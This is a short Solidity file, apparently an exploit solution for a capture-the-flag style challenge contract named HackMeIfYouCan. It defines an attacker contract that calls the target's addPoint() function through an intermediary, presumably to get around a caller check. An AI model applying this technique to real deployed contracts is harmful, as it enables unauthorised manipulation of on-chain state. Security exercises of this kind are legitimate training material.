// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;
import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract AddPointHack {
    address public hackMeIfYouCan;

    constructor(address _hackMeIfYouCan) {
        hackMeIfYouCan = _hackMeIfYouCan;
    }

    function attackAddPoint() public {
        HackMeIfYouCan hackMeContract = HackMeIfYouCan(payable(hackMeIfYouCan));
        hackMeContract.addPoint();
    }
}
